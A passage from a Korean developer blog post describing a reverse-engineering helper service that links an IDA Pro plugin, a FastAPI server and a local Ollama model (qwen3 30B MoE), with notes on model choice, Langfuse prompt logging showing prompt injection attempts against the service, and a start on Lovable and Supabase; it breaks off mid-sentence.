&#xD568;&#xC218; &#xB0B4;&#xC6A9;&#xC744; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xACA0;&#xB2E4; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(IDA&#xB97C; &#xC548; &#xD0A8;&#xC9C0; 1&#xB144;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xB2C8; &#xC774;&#xBBF8; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xB85C; &#xC788;&#xB294; &#xAC78; &#xB9CC;&#xB4E4;&#xBA74;&#xC11C; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4; &#xD558;&#xD558;&#x2026; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xB294;&#xAC8C; &#xCDE8;&#xC9C0;&#xB2C8;&#xAE4C;&#xC694;)</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC11C;&#xBE44;&#xC2A4; &#xD750;&#xB984;&#xB3C4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                                     &#x2502;   <span class="hljs-selector-tag">Supabase</span>      &#x2502;               &#x2502;   <span class="hljs-selector-tag">Langfuse</span>      &#x2502;                                    &#x2502;   &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;     &#x2502;               &#x2502;   &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;         &#x2502;                                    &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;               &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;</code></pre><h1 id="2-Ollama-&#xC11C;&#xBC84;"><a href="#2-Ollama-&#xC11C;&#xBC84;" class="headerlink" title="2. Ollama &#xC11C;&#xBC84;"></a>2. Ollama &#xC11C;&#xBC84;</h1><p>&#xBA3C;&#xC800; &#xC65C; &#xC0C1;&#xC6A9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC4F0;&#xC9C0; &#xC54A;&#xB0D0;?&#xB294; &#xC9C8;&#xBB38;&#xC774; &#xB4DC;&#xC2E4;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. Gemini, ChatGPT &#xB4F1; &#xC88B;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740;&#xB370; &#xB9D0;&#xC774;&#xC8E0;. &#xC77C;&#xB2E8; &#xAC1C;&#xC778;&#xC801;&#xC778; &#xC0DD;&#xAC01;&#xC740; &#x201C;&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xB294; &#xC791;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB85C;&#xB3C4; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#x201D; &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC3D;&#xC5C5; &#xC804; &#xD68C;&#xC0AC;&#xC5D0;&#xC11C;&#xB3C4; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xC5C8;&#xACE0;, &#xD604;&#xC7AC; &#xC5F0;&#xAD6C;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD574; &#xC5EC;&#xB7EC; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC131;&#xB2A5;&#xC758; &#xC81C;&#xD55C;&#xC73C;&#xB85C; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;&#xC694; &#x3160;&#x3160;</p><p>&#xD604;&#xC7AC; &#xC81C;&#xAC00; &#xC9D1;&#xC5D0;&#xC11C; LLM &#xCD94;&#xB860;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAE30;&#xAE30;&#xB294; &#xB9E5;&#xBBF8;&#xB2C8; &#xC785;&#xB2C8;&#xB2E4;. M4 Pro &#xCE69;&#xC744; &#xD0D1;&#xC7AC;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xB7A8;&#xC740; 64&#xAE30;&#xAC00; &#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0; Ollama &#xC11C;&#xBC84;&#xB97C; &#xC62C;&#xB9AC;&#xACE0; &#xBAA8;&#xB378;&#xC744; &#xC11C;&#xBE59;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://ollama.com/search">Ollama &#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xB97C; &#xAC00;&#xBCF4;&#xC2DC;&#xBA74; &#xB7A8; 64&#xAE30;&#xAC00; &#xB0B4;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/01.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-28 &#x110B;&#x1169;&#x1112;&#x116E; 3.55.01.png"></p><p>&#xCD5C;&#xADFC;&#xC5D0; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; gpt-oss, deepseek &#xB4F1; &#xBAA8;&#xB378; &#xC911;&#xC5D0;&#xC11C; &#xC800;&#xB294; 32B &#xC815;&#xB3C4; &#xD06C;&#xAE30;&#xC758; &#xBAA8;&#xB378;&#xB4E4; &#xC911; q8&#xB85C; &#xC591;&#xC790;&#xD654;&#xB41C; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xC88B;&#xC544;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC774;&#xC720;&#xB97C; &#xB4E4;&#xC5B4;&#xBCF4;&#xC790;&#xBA74;:</p><ul><li>70B q4 &#xBAA8;&#xB378;&#xB4E4;(&#xB2E4;&#xC6B4;&#xBC1B;&#xC73C;&#xBA74; &#xC57D; 40G &#xC815;&#xB3C4;)&#xC744; &#xB7A8; 64&#xAE30;&#xAC00;&#xC5D0;&#xC11C; &#xB3CC;&#xB9B4; &#xC218;&#xB294; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xB2F9;&#xC2DC; 70B &#xBAA8;&#xB378;&#xB4E4;&#xC740; &#xB098;&#xC628;&#xC9C0; &#xC870;&#xAE08; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB09C; &#xBAA8;&#xB378;&#xB4E4;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAE34; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xC704;&#xD55C; &#xACF5;&#xAC04;&#xB3C4; &#xB0A8;&#xACA8;&#xB46C;&#xC57C;&#xD55C;&#xB2E4; &#xC0DD;&#xAC01;&#xD574;&#xC11C; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC4F0;&#xBA74; &#xC88B;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>8&#xC6D4; &#xC911;&#xC21C;&#xCBE4;&#xC5D0; &#xB098;&#xC628; &#xD56B;&#xD55C; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xB4E4;&#xC774; &#xC788;&#xC5C8;&#xACE0; &#xC131;&#xB2A5;&#xC774; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. gpt-oss&#xC758; &#xACBD;&#xC6B0; 20B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xACE0;, qwen3&#xC5D0;&#xB294; 32B&#xACFC; 30B MoE &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC5C8;&#xC8E0;. &#xC774; &#xBAA8;&#xB378;&#xB4E4; &#xACBD;&#xC6B0;, &#xCCB4;&#xAC10;&#xC0C1; &#xCD5C;&#xC2E0; ChatGPT 4o &#xC815;&#xB3C4; &#xD639;&#xC740; &#xADF8;&#xBCF4;&#xB2E4; &#xC0B4;&#xC9DD; &#xB354; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xB0B4;&#xB294; &#xB4EF; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xC880; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC778; phi4 14B, gemma 27B &#xB4F1;&#xC744; &#xC81C;&#xAC00; &#xBBF8;&#xB9AC; &#xC138;&#xD305;&#xD574;&#xB454; &#xBA87; &#xAC1C;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xBA74;&#xC11C; &#xC131;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC5EC;&#xB7EC; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xAC70;&#xCE5C; &#xACB0;&#xACFC; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p>&#xB2F9;&#xC5F0;&#xD55C;&#xAC70;&#xC9C0;&#xB9CC; MoE &#xBAA8;&#xB378;&#xC774; &#xC77C;&#xBC18; &#xBAA8;&#xB378;&#xBCF4;&#xB2E4; &#xCD94;&#xB860;&#xC18D;&#xB3C4;&#xAC00; &#xD6E8;&#xC52C; &#xBE60;&#xB985;&#xB2C8;&#xB2E4;. Qwen3 32B q8 &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, 7 tps &#xC815;&#xB3C4;&#xC758; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC654;&#xACE0; Qwen 30B MoE &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0; &#xB192;&#xC73C;&#xBA74; 45 tps&#xAE4C;&#xC9C0; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC18C;&#xADDC;&#xBAA8; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0;&#xC11C; &#xC774;&#xC815;&#xB3C4;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs yaml"><span class="hljs-attr">total duration:</span>       <span class="hljs-number">54.</span><span class="hljs-string">782917709s</span><span class="hljs-attr">load duration:</span>        <span class="hljs-number">83.</span><span class="hljs-string">491792ms</span><span class="hljs-attr">prompt eval count:</span>    <span class="hljs-number">2649 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">prompt eval duration:</span> <span class="hljs-number">4.</span><span class="hljs-string">376536583s</span><span class="hljs-attr">prompt eval rate:</span>     <span class="hljs-number">605.27</span> <span class="hljs-string">tokens/s</span><span class="hljs-attr">eval count:</span>           <span class="hljs-number">2293 </span><span class="hljs-string">token(s)</span><span class="hljs-attr">eval duration:</span>        <span class="hljs-number">49.</span><span class="hljs-string">986260996s</span><span class="hljs-attr">eval rate:</span>            <span class="hljs-number">45.87</span> <span class="hljs-string">tokens/s</span></code></pre></li><li><p>Reasoning &#xBAA8;&#xB378;&#xC778; qwen3:30b-a3b-thinking-2507&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD14C;&#xC2A4;&#xD2B8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Reasoning&#xC774; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xBC84;&#xADF8;&#xAC00; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC2DC; &#xBAA8;&#xB378;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC9C0; &#xC5BC;&#xB9C8; &#xC548;&#xB41C; &#xBAA8;&#xB378;&#xC774;&#xB77C; &#xADF8;&#xB7EC;&#xB824;&#xB2C8; &#xD558;&#xACE0; &#xADF8;&#xB0E5; &#xC548; &#xC37C;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li>&#xB2E4;&#xB978; Reasoning &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xC720;&#xB294; &#xCD9C;&#xB825;&#xC774; &#xC644;&#xB8CC;&#xB420; &#xB54C;&#xAE4C;&#xC9C0; &#xC2DC;&#xAC04;&#xC774; &#xB354; &#xAC78;&#xB9B0;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. instruct &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC5B4;&#xC9C0;&#xAC04;&#xD55C; &#xCD9C;&#xB825;&#xAE4C;&#xC9C0;&#xB294; 2&#xBD84; &#xC548;&#xC5D0; &#xB098;&#xC62C; &#xC218; &#xC788;&#xC9C0;&#xB9CC; reasoning&#xC744; &#xD558;&#xB294; &#xC21C;&#xAC04; 1~2&#xBD84;&#xC774; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; reasoning&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC131;&#xB2A5;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xAE30;&#xB3C4; &#xD588;&#xACE0;&#xC694;.</li><li>&#xC774;&#xBCF4;&#xB2E4; &#xB354; &#xC791;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC791;&#xC5C5;&#xC774; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xD55C;&#xBC88;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC131;&#xB2A5;&#xC774; &#xB5A8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. phi4 14B &#xBAA8;&#xB378;&#xC758; &#xACBD;&#xC6B0;, &#xC131;&#xB2A5;&#xC740; &#xCDA9;&#xBD84;&#xD588;&#xC9C0;&#xB9CC; fp16 &#xBAA8;&#xB378;&#xC744; &#xC368;&#xC57C; &#xC131;&#xB2A5;&#xC774; &#xC4F8;&#xB9CC;&#xD55C; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xB098;&#xC654;&#xB294;&#xB370;, reasoning &#xC2DC;&#xAC04;&#xC774; &#xB108;&#xBB34; &#xAE38;&#xC5B4; &#xC2E4;&#xC0AC;&#xC6A9;&#xC5D0;&#xB294; &#xBB34;&#xB9AC;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC678; Qwen3 14B, 8B, Gemma 27B, Deepseek 14B &#xB4F1;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xD65C;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xACF5;&#xC218;&#xAC00; &#xB354; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; &#xACE0;&#xB824;&#xC0AC;&#xD56D; &#xC911;&#xC5D0; &#xC18D;&#xB3C4;, &#xC131;&#xB2A5;, &#xBA54;&#xBAA8;&#xB9AC; &#xB4F1;&#xC744; &#xACE0;&#xB824;&#xD588;&#xC744; &#xB54C; &#x201C;qwen3:30b-a3b-instruct-2507-q8_0&#x201D; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC81C;&#xC77C; &#xC801;&#xD569;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBAA8;&#xB378;&#xC744; &#xC815;&#xD588;&#xC73C;&#xB2C8; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xD658;&#xACBD;&#xBCC0;&#xC218; &#xC138;&#xD305;&#xD558;&#xACE0; <code>ollama serve</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xB9CC;&#xD558;&#xBA74; &#xC900;&#xBE44; &#xB05D;!&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;"><a href="#2-Langfuse&#xB85C;-&#xD504;&#xB86C;&#xD504;&#xD2B8;-&#xB85C;&#xAE45;" class="headerlink" title="2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;"></a>2. Langfuse&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB85C;&#xAE45;</h1><p>&#xC774;&#xAC83;&#xB3C4; &#xC5ED;&#xC2DC; &#x201C;LangSmith &#xC4F0;&#xBA74; &#xB418;&#xB294;&#xAC70; &#xC544;&#xB0D0;?&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2E4;&#xAC81;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC5ED;&#xC2DC; &#xC194;&#xB8E8;&#xC158; &#xAC1C;&#xBC1C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC628;&#xD504;&#xB808;&#xBBF8;&#xC2A4;&#xB97C; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD24;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xCC38;&#xC5D0; Langfuse&#xB97C; &#xC368;&#xBCF4;&#xC790;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Langfuse&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB798;&#xD3EC;&#xC5D0;&#xC11C; &#xBC1B;&#xC544; &#xBC14;&#xB85C; &#xB3C4;&#xCEE4;&#xB85C; &#xC62C;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, langchain&#xC5D0; langfuse&#xC758; callbackhandler&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC8FC;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC694;&#xCCAD;&#xB4E4;&#xC758; &#xB85C;&#xAE45;&#xC774; &#xC2DC;&#xC791;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/02.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.22.19.png"></p><p>&#xB85C;&#xAE45;&#xC744; &#xD558;&#xBA74; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xC804;&#xC1A1;&#xC774; &#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xC751;&#xB2F5;&#xC758; &#xD004;&#xB9AC;&#xD2F0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB098; &#xC2E4;&#xD589; &#xCCB4;&#xC778;&#xC744; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xACA0;&#xC8E0;.</p><p>&#xADF8;&#xB9AC;&#xACE0;! &#xACF5;&#xACA9;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/03.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.45.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/04.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 4.24.58.png"></p><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xC778;&#xC81D;&#xC158; &#xACF5;&#xACA9;&#xC774; &#xB0A0;&#xB77C;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8;&#xBCBD;&#xAE4C;&#xC9C0; &#xC5F4;&#xC2EC;&#xD788; &#xD558;&#xC168;&#xB294;&#xB370;&#x2026; &#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xC6D0;&#xD558;&#xC2DC;&#xB294; &#xC815;&#xBCF4;&#xB294; &#xAC00;&#xC838;&#xAC00;&#xC9C0; &#xBABB;&#xD558;&#xC2E0; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h1 id="3-Lovable-Supabase"><a href="#3-Lovable-Supabase" class="headerlink" title="3. Lovable + Supabase"></a>3. Lovable + Supabase</h1><p>&#xC6D0;&#xB798; &#xC800;&#xD76C; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xB294; Base44&#xB85C; &#xAC1C;&#xBC1C;&#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB124;, &#xBA87; &#xB2EC; &#xC804;&#xC5D0; <a href="https://techcrunch.com/2025/06/18/6-month-old-solo-owned-vibe-coder-base44-sells-to-wix-for-80m-cash/">$80M&#xC5D0; Wix&#xC5D0; &#xC778;&#xC218;&#xB41C; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xC774; &#xAE30;&#xC0AC;&#xB97C; &#xBCF4;&#xACE0; &#xC368;&#xBD24;&#xB294;&#xB370;&#xC694;, &#xAC04;&#xB2E8;&#xD55C; &#xB79C;&#xB529;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xAC1C;&#xBC1C;&#xD558;&#xB294; &#xAC83;&#xAE4C;&#xC9C0;&#xB294; &#xAD1C;&#xCC2E;&#xC558;&#xB294;&#xB370;, &#xB85C;&#xADF8;&#xC778; &#xAE30;&#xB2A5; &#xC774;&#xD6C4;&#xB85C; &#xBB38;&#xC81C;&#xAC00; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xAC1C;&#xBC1C;&#xD560; &#xB54C;&#xB294; &#xC815;&#xB9D0; &#xCD5C;&#xC545;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB798;&#xC11C; &#xB2F9;&#xC2DC; &#xBB58; 